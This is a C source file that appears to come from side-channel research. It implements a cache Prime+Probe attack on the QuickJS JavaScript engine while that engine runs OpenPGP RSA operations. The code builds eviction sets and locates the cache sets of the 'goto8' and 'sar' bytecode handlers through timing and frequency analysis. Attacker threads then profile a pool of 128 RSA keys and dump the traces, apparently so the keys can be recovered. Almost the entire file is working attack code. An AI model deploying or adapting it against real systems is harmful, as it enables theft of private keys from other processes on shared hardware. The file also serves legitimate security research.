#include "arch.h"
#include "config.h"
#include "log.h"
#include "prime_probe.h"
#include "cache/cache_param.h"
#include "quickjs_runtime.h"
#include "dsp.h"
#include "shared_memory.h"

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <math.h>
#include <pthread.h>
#include <semaphore.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <x86intrin.h>

enum { cache_line_count = 2, profile_samples = 1 << 15 };
static uint64_t victim_runs = 128;
static const int key_pool_size = 128;
static const char *test_name = "quickjs_openpgp_rsa_key_pool";
static const uint64_t max_exec_cycles = (uint64_t)3e9;

static const uint32_t sar_base_freq = 4667, goto8_base_freq = 9333;
static uint64_t probe_time_arr[cache_line_count][profile_samples];
static uint64_t sample_tsc_arr[cache_line_count][profile_samples];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *probe_time[cache_line_count];

static PS_attacker_thread_config_t pt_goto8, pt_sar;
static pthread_barrier_t attacker_threads_barrier;

static int qsort_lt(const void *a, const void *b) {
	int64_t va = (*(int64_t *)a);
	int64_t vb = (*(int64_t *)b);
	if (va == vb) {
		return 0;
	} else {
		return va < vb ? -1 : 1;
	}
}

static int check_goto8_distribution(uint64_t *probes, int length) {
	uint64_t ts_diff[profile_samples];
	memset(ts_diff, 0, sizeof(ts_diff));
	for (int i = 1; i < length; ++i) {
		ts_diff[i - 1] = probes[i] - probes[i - 1];
	}
	qsort(ts_diff, length - 1, sizeof(uint64_t), qsort_lt);
	// FIXME: 1/7 sometimes go off the cluster
	// use 1/8 but k-means might be better
	int per_0 = (length - 1) * 1.0 / 2, per_1 = round((length - 1) * (7.0 / 8));
	double ratio = (double)ts_diff[per_1] / ts_diff[per_0];
	log_debug("goto8 50%% %ld, 87.5%% %ld, ratio %.10f",
	          ts_diff[per_0],
	          ts_diff[per_1],
	          ratio);
	return fabs(2 - ratio) < 0.1;
}

static int check_sar_distribution(uint64_t *probes, int length) {
	uint64_t ts_diff[profile_samples];
	memset(ts_diff, 0, sizeof(ts_diff));
	for (int i = 1; i < length; ++i) {
		ts_diff[i - 1] = probes[i] - probes[i - 1];
	}
	qsort(ts_diff, length - 1, sizeof(uint64_t), qsort_lt);
	int per_0 = round((length - 1) * (15. / 100)),
	    per_1 = round((length - 1) * (90. / 100));
	double ratio = (double)ts_diff[per_1] / ts_diff[per_0];
	log_debug("sar 15%% %ld, 90%% %ld, ratio %.10f",
	          ts_diff[per_0],
	          ts_diff[per_1],
	          ratio);
	return fabs(1 - ratio) < 0.1;
}

static int identify_quickjs_target_sets(EVSet **evset_goto8,
                                        EVSet **evset_sar) {
	config_t *cfg = get_config();
	int found = 0;

	if (cache_env_init(1)) {
		log_error("Failed to initialize cache env!\n");
		return 0;
	}

	helper_thread_ctrl hctrl;

	if (LLCF_multi_evset(0, &hctrl)) {
		log_error("Failed to build evset");
		return 0;
	}

	log_info("l2 thres %d, interrupt thres %d",
	         detected_cache_lats.l2_thresh,
	         detected_cache_lats.interrupt_thresh);

	if (start_helper_thread(&hctrl)) {
		log_error("Failed to start helper!\n");
		return 0;
	}

	EVSet *evset;
	srand(time(NULL));

	/* quickjs_loop_barriers_init(); */
	init_sync_ctx(QUICKJS_PROJ_ID);
	pthread_barrier_wait(sync_ctx.barrier);

	log_info("Quickjs loop warmup");
	pthread_barrier_wait(sync_ctx.barrier);

	pthread_barrier_wait(sync_ctx.barrier);
	log_info("Quickjs loop warmup done");

	// pin_cpu(pinned_cpu0);

	uint32_t target_goto8_page_slot = (target_goto8 & PAGE_MASK) >>
	                                  CACHE_LINE_BITS;
	uint32_t target_sar_page_slot = (target_sar & PAGE_MASK) >> CACHE_LINE_BITS;
	int goto8_l3_index, sar_l3_index;
	/* int expect_goto8_cnt = (1 << 12); */
	/* int expect_sar_cnt = expect_goto8_cnt * 1.5; */

	log_info("goto8 slot %x, sar slot %x",
	         target_goto8_page_slot,
	         target_sar_page_slot);

	for (int l3_set = 0; l3_set < cfg->l3.sets; ++l3_set) {
		int page_slot = l3_set % NUM_PAGE_SLOTS;
		int check_goto8_set = *evset_goto8 == NULL &&
		                      target_goto8_page_slot + 0 <= page_slot &&
		                      page_slot < target_goto8_page_slot + 2;
		int check_sar_set = *evset_sar == NULL &&
		                    target_sar_page_slot + 0 <= page_slot &&
		                    page_slot < target_sar_page_slot + 2;
		/* check_sar_set = 0; */
		/* check_goto8_set = 0; */

		if (!check_goto8_set && !check_sar_set) {
			continue;
		} else {
			log_debug("l3_set: %x, page_slot: %x", l3_set, page_slot);
		}

		evset = get_sf_kth_evset(l3_set);
		if (evset) {
			memset(sample_tsc_arr, 0, sizeof(sample_tsc_arr));
			memset(probe_time_arr, 0, sizeof(probe_time_arr));

			PS_profile_once(evset,
			                0,
			                profile_samples,
			                max_exec_cycles,
			                sample_tsc,
			                probe_time);

		} else {
			log_error("Cannot build evset for set %d", l3_set);
		}

		int sample_cnt = 0;
		for (int i = 0; i < profile_samples; ++i) {
			if (sample_tsc_arr[0][i] != 0) {
				++sample_cnt;
			}
		}
		if (check_goto8_set && sample_cnt > 256) {
			log_info("Check goto8 Set: %d, Count %d", l3_set, sample_cnt);
			if (check_goto8_distribution(sample_tsc_arr[0], sample_cnt) &&
			    check_cache_set_psd(
			        sample_tsc_arr[0], sample_cnt, PS_fs, goto8_base_freq)) {
				*evset_goto8 = evset;
				log_info(LOG_BOLD_ON
				         "Find goto8 evset Set: %d %p, Count %d" LOG_BOLD_OFF,
				         l3_set,
				         evset,
				         sample_cnt);
				goto8_l3_index = l3_set;
			}
			dump_profiling_trace(test_name,
			                     l3_set,
			                     sample_tsc,
			                     probe_time,
			                     cache_line_count,
			                     sample_cnt);
		}
		if (check_sar_set && sample_cnt > 256) {
			log_info("Check sar Set: %d, Count %d", l3_set, sample_cnt);
			if (check_sar_distribution(sample_tsc_arr[0], sample_cnt) &&
			    check_cache_set_psd(
			        sample_tsc_arr[0], sample_cnt, PS_fs, sar_base_freq)) {
				*evset_sar = evset;
				log_info(LOG_BOLD_ON
				         "Find sar evset Set: %d %p, Count %d" LOG_BOLD_OFF,
				         l3_set,
				         evset,
				         sample_cnt);
				sar_l3_index = l3_set;
			}
			dump_profiling_trace(test_name,
			                     l3_set,
			                     sample_tsc,
			                     probe_time,
			                     cache_line_count,
			                     sample_cnt);
		}

		if (*evset_goto8 != NULL && *evset_sar != NULL) {
			log_info("Find goto8 %d %p and sar %d %p evsets",
			         goto8_l3_index,
			         *evset_goto8,
			         sar_l3_index,
			         *evset_sar);
			found = 1;
			break;
		}
	}

	stop_helper_thread(&hctrl);
	return found;
}

void openpgp_rsa_key_pool() {
	pthread_t thread0 = 0, thread1 = 0, thread2 = 0;
	int err;
    char test_key_name[256];

	if (pthread_barrier_init(&attacker_threads_barrier, NULL, 2) != 0) {
		log_error("Error initializing barrier\n");
		return;
	}

	for (int key_id = 0; key_id < key_pool_size; ++key_id) {
		sprintf(test_key_name, "%s_key%05d", test_name, key_id);
		log_info("test key name %s", test_key_name);

		snprintf(
		    (char *)sync_ctx.data, sync_ctx_data_size, "KEY_ID=%d", key_id);
		pt_goto8.test_name = test_key_name;
		pt_sar.test_name = test_key_name;
		err = pthread_create(&thread0, NULL, PS_attacker_thread, &pt_goto8);
		if (err != 0)
			log_error("can't create thread0 :[%s]", strerror(err));

		err = pthread_create(&thread1, NULL, PS_attacker_thread, &pt_sar);
		if (err != 0)
			log_error("can't create thread1 :[%s]", strerror(err));

		pthread_join(thread0, NULL);
		pthread_join(thread1, NULL);
	}

	pthread_barrier_destroy(&attacker_threads_barrier);
}

int main() {
	quickjs_get_bytecode_handler_cacheline();

	const char *env_victim_runs = getenv("VICTIM_RUNS");
	if (env_victim_runs != NULL) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(env_victim_runs, &endptr, 10);
		if (errno == 0 && endptr != env_victim_runs && *endptr == '\0') {
			victim_runs = value;
		}
	}

	for (int i = 0; i < cache_line_count; ++i) {
		sample_tsc[i] = sample_tsc_arr[i];
		probe_time[i] = probe_time_arr[i];
	}

	PS_thread_config_init(pt_goto8);
	pt_goto8.label = "goto8";
	pt_goto8.slot = 0;
	pt_goto8.pin_cpu = -1;
	/* pt_goto8.pin_cpu = pinned_cpu1; */
	pt_goto8.target = (u8 *)((uintptr_t)target_goto8 + CACHE_LINE_SIZE);

	PS_thread_config_init(pt_sar);
	pt_sar.label = "sar";
	pt_sar.slot = 1;
	pt_sar.pin_cpu = -1;
	/* pt_sar.pin_cpu = pinned_cpu2; */
	pt_sar.target = (u8 *)((uintptr_t)target_sar + CACHE_LINE_SIZE);

	int found_sets =
	    identify_quickjs_target_sets(&pt_goto8.evset, &pt_sar.evset);

	if (!found_sets) {
		log_error("Could not find target set for goto8 and sar");
		return -1;
	}

	openpgp_rsa_key_pool();
	return 0;
}
